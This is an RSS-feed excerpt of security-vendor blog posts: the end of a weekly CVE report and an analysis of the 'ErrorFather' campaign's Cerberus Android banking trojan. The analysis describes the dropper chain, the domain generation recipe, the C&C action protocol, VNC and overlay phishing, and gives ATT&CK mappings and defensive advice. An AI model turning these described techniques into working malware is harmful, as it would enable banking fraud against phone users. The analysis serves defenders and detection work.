<li><strong>CVE-2024-44193:</strong> This is a vulnerability affecting Apple iTunes for Windows, specifically versions prior to 12.13.3. The vulnerability allows local attackers to elevate their privileges on affected systems, posing significant security risks.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><strong>CVE-2024-8275:</strong> A <a href="https://cyble.com/knowledge-hub/cyber-threat-actor-and-types/">threat actor</a> (TA) shared a PoC on a forum for a critical SQL injection vulnerability discovered in the Events Calendar Plugin for WordPress. The vulnerability affects all versions up to and including 6.6.4 and arises from insufficient input validation in specific functions.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><strong>CVE-2024-43363:</strong> A TA on a forum shared a PoC for a high-severity vulnerability affecting Cacti, a fault management framework. The vulnerability allows attackers to exploit the system remotely, potentially compromising <a href="https://cyble.com/knowledge-hub/what-is-a-computer-worm/">sensitive data</a> and system integrity.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Cyble Recommendations</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>To protect against these vulnerabilities and exploits, organizations should implement the following best practices:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>To mitigate vulnerabilities and protect against exploits, regularly update all software and hardware systems with the latest patches from official vendors.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Develop a comprehensive patch management strategy that includes inventory management, patch assessment, testing, deployment, and verification. Automate the process where possible to ensure consistency and efficiency.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Divide your network into distinct segments to isolate critical assets from less secure areas. Use firewalls, VLANs, and access controls to limit access and reduce the <a href="https://cyble.com/solutions/attack-surface-management/">attack surface</a> exposed to potential <a href="https://cyble.com/knowledge-hub/what-are-cyber-threats/">threats</a>.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Create and maintain an <a href="https://cyble.com/knowledge-hub/what-is-incident-response/">incident response</a> plan that outlines procedures for detecting, responding to, and recovering from security incidents. Regularly test and update the plan to ensure its effectiveness and alignment with current threats.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Implement comprehensive monitoring and logging solutions to detect and analyze <a href="https://cyble.com/knowledge-hub/what-is-a-data-breach/">suspicious activities</a>. Use SIEM (Security Information and Event Management) systems to aggregate and correlate logs for real-time threat detection and response.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Subscribe to security advisories and alerts from official vendors, CERTs, and other authoritative sources. Regularly review and assess the impact of these alerts on your systems and take appropriate actions.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Conduct regular vulnerability assessment and penetration testing (VAPT) exercises to identify and remediate vulnerabilities in your systems. Complement these exercises with periodic security audits to ensure compliance with security policies and standards.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Conclusion</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>These vulnerabilities highlight the urgent need for security teams to prioritize patching critical vulnerabilities in major products. With increasing discussions of these exploits on <a href="https://cyble.com/solutions/dark-web-monitoring/">dark web</a> forums, organizations must stay vigilant and proactive. Implementing strong security practices is essential to protect sensitive data and maintain system integrity.</p>
<p><!-- /wp:paragraph --></p>
<p>The post <a href="https://cyble.com/blog/weekly-it-vulnerability-report-cyble-urges-fixes-for-ivanti-microsoft-dark-web-exploits/" rel="nofollow">Weekly IT Vulnerability Report: Cyble Urges Fixes for Ivanti, Microsoft Dark Web Exploits</a> appeared first on <a href="https://cyble.com" rel="nofollow">Cyble</a>.</p>
]]></content:encoded>
<pubDate>Tue, 15 Oct 2024 09:52:06 +0000</pubDate>
</item>
<item>
<title>Hidden in Plain Sight: ErrorFather’s Deadly Deployment of Cerberus</title>
<link>https://cyble.com/blog/hidden-in-plain-sight-errorfathers-deadly-deployment-of-cerberus/</link>
<guid>https://cyble.com/blog/hidden-in-plain-sight-errorfathers-deadly-deployment-of-cerberus/</guid>
<content:encoded><![CDATA[
<p><img alt="Cyble-Blogs-Error-Fathers" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="600" src="https://cyble.com/wp-content/uploads/2024/10/Cyble-Blogs-Error-Fathers.png" tabindex="0" title="Hidden in Plain Sight: ErrorFather&#039;s Deadly Deployment of Cerberus 9" width="1200" /></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><strong>Key Takeaways</strong></h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Cyble Research and Intelligence Labs (CRIL) identified a campaign called “ErrorFather” that utilized an&nbsp;undetected Cerberus Android Banking Trojan payload.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>ErrorFather employs a sophisticated infection chain involving multiple stages (session-based droppers, native libraries, and encrypted payloads), complicating detection and removal efforts.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>The campaign ramped up in activity in September and October 2024, with more samples and ongoing campaigns suggesting active targeting and scaling by the <a href="https://cyble.com/knowledge-hub/cyber-threat-actor-and-types/">Threat Actors</a> (TAs) behind the ErrorFather campaign.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>The final payload employs keylogging, overlay attacks, VNC, and Domain Generation Algorithm (DGA) to perform malicious activities.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>ErrorFather's incorporation of a Domain Generation Algorithm (DGA) ensures resilience by enabling dynamic C&amp;C server updates, keeping the malware operational even if primary servers are taken down.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>The campaign highlights how repurposed malware from leaks can continue to pose significant threats years after its original appearance.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><strong>Overview</strong></h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The Cerberus Android Banking Trojan initially emerged in 2019 and was available for rent on underground forums. It gained notoriety for its ability to target financial and social media apps by exploiting the Accessibility service, using overlay attacks, and incorporating VNC and keylogging features. Its widespread reach made it one of the most well-known banking trojans at the time.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>In 2020, following the leak of Cerberus' source code, a new variant called "Alien" appeared, leveraging Cerberus' codebase. Then, in 2021, another banking trojan called "<a href="https://cyble.com/blog/ermac-back-in-action/">ERMAC</a>" surfaced, also building on Cerberus' code and targeting over 450 financial and social media apps.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>At the beginning of 2024, a new threat known as the <a href="https://cryptax.medium.com/android-phoenix-authors-claims-sample-identification-and-trends-f199cbc9901d">Phoenix</a> Android Banking Trojan was discovered. Claiming to be a fresh botnet, Phoenix was found being sold on underground forums. However, it was identified as yet another fork of Cerberus, utilizing its exact source code, whereas Alien and ERMAC had introduced some modifications.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Cyble Research and Intelligence Labs (CRIL) recently uncovered several malicious samples posing as Chrome and Play Store apps. These samples use a multi-stage dropper to deploy a banking trojan payload, which was found to be leveraging the Cerberus Banking Trojan.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The identified sample “0c27ec44ad5333b4440fbe235428ee58f623a878baefe08f2dcdad62ad5ffce7” acts as a first-stage dropper application that drops and installs the final-signed.apk from assets, communicates with a Telegram Bot URL, and sends the&nbsp;device model, brand, and API version.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":67126,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67126" src="https://cyble.com/wp-content/uploads/2024/10/image-1.png" /><figcaption class="wp-element-caption"><em>Figure 1 – First-stage malware connecting to Telegram Bot URL</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The Telegram Bot ID corresponds to the ErrorFather Bot, as shown in the figure below. Given the bot's name and the recent updates to this variant (covered in the Technical Analysis section), we are referring to this campaign as ErrorFather.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":67127,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67127" src="https://cyble.com/wp-content/uploads/2024/10/image-2.png" /><figcaption class="wp-element-caption"><em>Figure 2 – ErrorFather Telegram bot</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>We have identified approximately 15 samples related to the ErrorFather campaign, including session-based droppers and their associated payloads. The first sample was detected in mid-September 2024, followed by a noticeable increase in samples during the first week of October 2024, with an active Command and Control (C&amp;C) server suggesting ongoing campaigns.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":67128,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67128" src="https://cyble.com/wp-content/uploads/2024/10/image-3.png" /><figcaption class="wp-element-caption"><em>Figure 3 – Samples related to the&nbsp;ErrorFather campaign</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>The following section provides a technical analysis of the Cerberus <a href="https://cyble.com/knowledge-hub/what-is-malware/">malware</a> used by the ErrorFather Campaign.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><strong>Technical Details</strong></h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>Multi-staged dropper</strong></h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The primary APK is a session-based dropper that contains a second-stage APK file named “final-signed.apk” within the Assets folder. It uses the Google Play Store icon and employs a session-based installation technique to install the APK from the assets, bypassing restricted settings.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":67130,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67130" src="https://cyble.com/wp-content/uploads/2024/10/image-4.png" /><figcaption class="wp-element-caption"><em>Figure 4 – Session-based dropper</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>The second-stage dropper, "final-signed.apk," has a manifest file that requests dangerous permissions and services, but the code implementation is missing, indicating that the malware is packed. It includes a native file, "libmcfae.so," which is immediately loaded after installation to decrypt and execute the final payload.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":67131,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67131" src="https://cyble.com/wp-content/uploads/2024/10/image-5.png" /><figcaption class="wp-element-caption"><em>Figure 5 – Second-stage dropper loading native file</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>The native file is responsible for handling the final payload. It uses the encrypted file “rbyypivsnw.png,” obtains the AES key and initialization vector (IV), performs decryption, and loads the “decrypted.dex” file at the location /data/data/suds.expend.affiliate.rising/code_cache/, as illustrated in the figure below.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":67132,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67132" src="https://cyble.com/wp-content/uploads/2024/10/image-6.png" /><figcaption class="wp-element-caption"><em>Figure 6 – Third-stage dropper loading final payload</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>The decrypted.dex file is the final payload, containing malicious functionalities such as keylogging, overlay attacks, VNC, PII collection, and the use of a Domain Generation Algorithm (DGA) to create a Command and Control (C&amp;C) server. Notably, when submitted to VirusTotal, the decrypted.dex file was not flagged by any antivirus engine.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":67151,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67151" src="https://cyble.com/wp-content/uploads/2024/10/image-20.png" /><figcaption class="wp-element-caption"><em>Figure 7 – Zero detection</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>Leveraging Cerberus code</strong></h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Based on the detection count, initially, we suspected it to be a fresh banking trojan, but upon deeper analysis of the final payload, we discovered significant code similarities with Cerberus. The TA behind the&nbsp;ErrorFather campaign had modified variable names, used more obfuscation, and reorganized the code, effectively evading detection despite Cerberus being identified in 2019.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":67136,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67136" src="https://cyble.com/wp-content/uploads/2024/10/image-9.png" /><figcaption class="wp-element-caption"><em>Figure 8 – ErrorFather’s shared preference settings containing common keys and following a&nbsp;similar structure as Cerberus</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>Comparing the Cerberus sample and the more recent <a href="https://cryptax.medium.com/android-phoenix-authors-claims-sample-identification-and-trends-f199cbc9901d">Phoenix</a> botnet, we noticed changes in this recent variant of Cerberus used in the&nbsp;ErrorFather campaign, particularly in its C&amp;C structure. These differences suggest that the identified sample is a distinct malware variant.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>Use of DGA</strong></h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>We observed the malware retrieving list of C&amp;C servers using two methods. First, after installation and establishing a connection with the main C&amp;C server, referred to by the TA as "PoisonConnect," the malware receives a list of four additional C&amp;C servers. It then stores these in the "ConnectGates" shared preferences setting, as shown in the figure below.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":67137,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67137" src="https://cyble.com/wp-content/uploads/2024/10/image-10.png" /><figcaption class="wp-element-caption"><em>Figure 9 – Malware receiving C&amp;C server list</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:image {"id":67138,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67138" src="https://cyble.com/wp-content/uploads/2024/10/image-11.png" /><figcaption class="wp-element-caption"><em>Figure 10 – Received list of C&amp;C server saved to Shared Preference</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>We observed a slight variation in the C&amp;C communication. Samples from the ErrorFather campaign solely use RC4 encryption to send a full JSON payload, including the action type. In contrast, earlier Cerberus samples utilized Base64 encoding combined with RC4, with the action type sent unencrypted via separate parameters. The figure below illustrates the C&amp;C communication for both the ErrorFather campaign and the earlier Cerberus samples.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":67139,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67139" src="https://cyble.com/wp-content/uploads/2024/10/image-12.png" /><figcaption class="wp-element-caption"><em>Figure 11 – C&amp;C communication of ErrorFather (left) and earlier Cerberus samples (Right)</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>Second, the malware incorporates a DGA (Domain Generation Algorithm) that utilizes the Istanbul timezone to obtain the current date and time. It then generates MD5 and passes the digest to SHA-1 hash, appending one of four extensions: ".click", ".com", ".homes", and ".net". These generated domains are stored in the same "ConnectGates" setting. The figure below demonstrates the DGA used in the&nbsp;ErrorFather campaign.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":67141,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67141" src="https://cyble.com/wp-content/uploads/2024/10/image-13.png" /><figcaption class="wp-element-caption"><em>Figure 12 – DGA used in the&nbsp;ErrorFather campaign</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:image {"id":67142,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67142" src="https://cyble.com/wp-content/uploads/2024/10/image-14.png" /><figcaption class="wp-element-caption"><em>Figure 13 – DGA code</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>The figure below illustrates the malware connecting to domains generated by a DGA when the primary C&amp;C server is unavailable.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":67144,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67144" src="https://cyble.com/wp-content/uploads/2024/10/image-15.png" /><figcaption class="wp-element-caption"><em>Figure 14 – Malware connecting to the domains generated by DGA</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>In 2022, <a href="https://x.com/_CPResearch_/status/1603375823448317953">Alien</a> was observed similarly implementing a DGA process. However, unlike the&nbsp;ErrorFather campaign, it did not maintain a list of domains, used only the ".xyz" extension, and did not rely on a specific timezone.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>Actions used by malware</strong></h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The TA has renamed the "Actions" to "Types," as shown in Figure 11. These renamed types indicate the actions performed by the malware and the expected commands from the C&amp;C server. Upon analysis, we observed that the actions carried out by this malware closely resemble those seen in earlier Cerberus variants, with the primary difference being the renaming of action identifiers. Below is a comprehensive list of actions performed by the malware.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table class="has-fixed-layout">
<tbody>
<tr>
<td><strong>Type of action</strong></td>
<td><strong>Description</strong></td>
</tr>
<tr>
<td>checkAppList</td>
<td>Send the list of installed application package names</td>
</tr>
<tr>
<td>getFile</td>
<td>Sends the target application package name to receive the&nbsp;HTML injection file</td>
</tr>
<tr>
<td>getResponse</td>
<td>Retrieve the server's response, and if it is “ok”, store the application log in the shared preferences file.</td>
</tr>
<tr>
<td>PrimeService</td>
<td>This action is used to send key logs of targeted application.</td>
</tr>
<tr>
<td>getBox</td>
<td>This action is used to send SMSs from the&nbsp;infected device.</td>
</tr>
<tr>
<td>fa2prime</td>
<td>Not Implemented</td>
</tr>
<tr>
<td>prContact</td>
<td>Used to send contacts to the server</td>
</tr>
<tr>
<td>listAppX</td>
<td>This action is similar to the "checkAppList" function, where the malware stores the list of installed application package names based on a command from the server; otherwise, the list remains empty. It will then send the list of installed application package names using this action name.</td>
</tr>
<tr>
<td>slService</td>
<td>Sends Accessibility logs</td>
</tr>
<tr>
<td>ErrorWatch</td>
<td>Sends error logs using this action type</td>
</tr>
<tr>
<td>device_status</td>
<td>Sends device status related to WebSocket connection</td>
</tr>
<tr>
<td>image</td>
<td>Sends captured images as a part of the&nbsp;VNC function</td>
</tr>
<tr>
<td>traverse</td>
<td>Sends accessibility node information</td>
</tr>
<tr>
<td>CheckDomain</td>
<td>This action is sent by DGA generated domain to validate domain</td>
</tr>
<tr>
<td>RegisterUser</td>
<td>Registers device and receives registration ID, it is similar to bot ID</td>
</tr>
<tr>
<td>CheckUser</td>
<td>Sends setting information and checks whether the&nbsp;user is registered or not</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><strong>VNC implementation using MediaProjection</strong></h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>During our malware analysis, we identified two keywords related to VNC: "StatusVNC" and "StatusHVNC." While HVNC implementation is absent in this campaign, it was previously present in the Phoenix botnet, a fork of Cerberus. VNC functionality is implemented using MediaProjection, along with a WebSocket connection to continuously transmit screen images and receive VNC actions from the Websocket response to interact with the device.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":67145,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67145" src="https://cyble.com/wp-content/uploads/2024/10/image-16.png" /><figcaption class="wp-element-caption"><em>Figure 15 – The VNC WebSocket connection is used to receive commands that trigger actions on the infected device</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><strong>Overlay Attack</strong></h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The overlay technique remains unchanged from the earlier Cerberus variant. The malware first sends the installed application package names list to identify potential targets. Once a target is identified, the server responds with the package names of the target applications. The malware then uses the "getFile" action to retrieve the HTML web injection page, as shown in the figure below.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":67146,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67146" src="https://cyble.com/wp-content/uploads/2024/10/image-17.png" /><figcaption class="wp-element-caption"><em>Figure 16 – Malware sends installed application package names and receives target application</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:image {"id":67147,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67147" src="https://cyble.com/wp-content/uploads/2024/10/image-18.png" /><figcaption class="wp-element-caption"><em>Figure 17 – Receives HTML injection file</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>When the victim interacts with the target application, the malware loads a fake phishing page over the legitimate app. This tricks the victim into entering their login credentials and credit card details on the fraudulent banking overlay page.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":67148,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-67148" src="https://cyble.com/wp-content/uploads/2024/10/image-19.png" /><figcaption class="wp-element-caption"><em>Figure 18 – HTML injection page for BBVA bank</em></figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p>The Cerberus malware used in the ErrorFather campaign can carry out financial fraud through VNC, keylogging, and overlay attacks.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><strong>Conclusion</strong></h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The Cerberus Android Banking Trojan, first identified in 2019, became a prominent tool for financial fraud using VNC, keylogging, and overlay attacks. Following the leak of its source code, various threat actors repurposed the Cerberus code to develop new banking trojans, including Alien, ERMAC, and Phoenix. The ErrorFather campaign is another example of this pattern. While the TA behind ErrorFather has slightly modified the malware, it remains primarily based on the original Cerberus code, making it inappropriate to classify it as entirely new malware.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>In the ErrorFather campaign, the malware uses a multi-stage dropper to deploy its payload and leverages techniques such as VNC, keylogging, and HTML injection for fraudulent purposes. Notably, the campaign utilizes a Telegram bot named "ErrorFather" to communicate with the malware. Despite being an older malware strain, the modified Cerberus used in this campaign has successfully evaded detection by antivirus engines, further highlighting the ongoing risks posed by retooled malware from previous leaks.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The ErrorFather campaign exemplifies how cybercriminals continue to repurpose and exploit leaked malware source code, underscoring the persistent threat of Cerberus-based attacks even years after the original malware's discovery.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><strong>Our Recommendations</strong></h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>We have listed some essential <a href="https://cyble.com/knowledge-hub/cybersecurity/">cybersecurity </a>best practices that create the first line of control against attackers. We recommend that our readers follow the best practices given below:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Download and install software only from official app stores like Google Play Store or the iOS App Store.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Use a reputed anti-virus and internet security software package on your connected devices, such as PCs, laptops, and mobile devices.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Use strong passwords and enforce <a href="https://cyble.com/blog/multi-factor-authentication-mfa-is-a-part-of-your-cyber-hygiene/">multi-factor authentication</a> wherever possible.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Enable biometric security features such as fingerprint or facial recognition for unlocking the mobile device where possible.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Be wary of opening any links received via SMS or emails delivered to your phone.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Ensure that Google Play Protect is enabled on Android devices.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Be careful while enabling any permissions.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Keep your devices, operating systems, and applications updated.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">MITRE ATT&amp;CK® Techniques</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table class="has-fixed-layout">
<tbody>
<tr>
<td><a><strong>Tactic</strong></a></td>
<td><strong>Technique ID</strong></td>
<td><strong>Procedure</strong></td>
</tr>
<tr>
<td><strong>Initial Access (</strong><a href="https://attack.mitre.org/tactics/TA0027">TA0027</a><strong>)</strong></td>
<td>Phishing (<a href="https://attack.mitre.org/techniques/T1660/">T1660</a>)</td>
<td>Malware distributing via phishing site</td>
</tr>
<tr>
<td><strong>Execution (</strong><a href="https://attack.mitre.org/tactics/TA0041">TA0041</a><strong>)</strong></td>
<td>Native API (<a href="https://attack.mitre.org/techniques/T1575/">T1575</a>)</td>
<td>Malware using native code to drop final payload</td>
</tr>
<tr>
<td><strong>Defense Evasion (</strong><a href="https://attack.mitre.org/tactics/TA0030/"><strong>TA0030</strong></a><strong>)</strong><strong></strong></td>
<td>Masquerading: Match Legitimate Name or Location (<a href="https://attack.mitre.org/techniques/T1655/001/">T1655.001</a>)</td>
<td>Malware pretending to be the Google Play Update and Chrome application</td>
</tr>
<tr>
<td><strong>Defense Evasion (</strong><a href="https://attack.mitre.org/tactics/TA0030/"><strong>TA0030</strong></a><strong>)</strong><strong></strong></td>
<td>Application Discovery (<a href="https://attack.mitre.org/versions/v10/techniques/T1418/">T1418</a>)</td>
<td>Collects installed application package name list to identify target</td>
</tr>
<tr>
<td><strong>Defense Evasion (</strong><a href="https://attack.mitre.org/tactics/TA0030/"><strong>TA0030</strong></a><strong>)</strong><strong></strong></td>
<td>Indicator Removal on Host:&nbsp;Uninstall Malicious Application (<a href="https://attack.mitre.org/techniques/T1630/001/">T1630.001</a>) &nbsp;</td>
<td>Malware can uninstall itself</td>
</tr>
<tr>
<td><strong>Defense Evasion (</strong><a href="https://attack.mitre.org/tactics/TA0030/"><strong>TA0030</strong></a><strong>)</strong><strong></strong></td>
<td>Input Injection (<a href="https://attack.mitre.org/techniques/T1516/">T1516</a>)</td>
<td>Malware can mimic user interaction, perform clicks and various gestures, and input data</td>
</tr>
<tr>
<td><strong>Collection (</strong><a href="https://attack.mitre.org/tactics/TA0035/">TA0035</a><strong>)</strong></td>
<td>Input Capture: Keylogging (<a href="https://attack.mitre.org/techniques/T1417/001/">T1417.001</a>)</td>
<td>Malware can capture keystrokes</td>
</tr>
<tr>
<td><strong>Discovery (</strong><a href="https://attack.mitre.org/tactics/TA0032">TA0032</a><strong>)</strong></td>
<td>Software Discovery (<a href="https://attack.mitre.org/techniques/T1418/">T1418</a>)</td>
<td>Malware collects installed application package list</td>
</tr>
<tr>
